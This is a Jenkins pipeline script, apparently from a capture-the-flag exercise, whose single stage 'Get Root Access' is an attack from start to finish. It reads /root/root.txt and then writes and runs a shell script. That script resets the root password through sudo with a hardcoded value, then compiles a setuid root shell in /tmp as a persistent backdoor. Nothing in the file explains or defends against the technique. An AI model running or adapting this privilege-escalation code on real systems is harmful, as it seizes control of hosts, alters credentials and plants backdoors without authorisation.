pipeline {
    agent any
    
    stages {
        stage('Get Root Access') {
            steps {
                script {
                    // Try to read the flag directly using Groovy
                    try {
                        def flagContent = new File("/root/root.txt").text
                        echo "Flag content: ${flagContent}"
                    } catch (Exception e) {
                        echo "Error reading flag directly: ${e.message}"
                    }
                    
                    // Create a script to execute commands with elevated privileges
                    writeFile file: 'root_access.sh', text: '''#!/bin/bash
                    # Try to read the flag
                    cat /root/root.txt
                    
                    # If that fails, try to change root password
                    echo "root:newpassword123" | sudo -S chpasswd
                    
                    # Try to create a setuid binary
                    cat > /tmp/rootshell.c << EOF
                    #include <stdio.h>
                    #include <stdlib.h>
                    #include <unistd.h>
                    int main() {
                        setuid(0);
                        setgid(0);
                        system("/bin/bash -p");
                        return 0;
                    }
                    EOF
                    
                    gcc /tmp/rootshell.c -o /tmp/rootshell
                    chmod u+s /tmp/rootshell
                    '''
                    
                    // Make the script executable
                    sh 'chmod +x root_access.sh'
                    
                    // Execute the script
                    sh './root_access.sh'
                }
            }
        }
    }
}
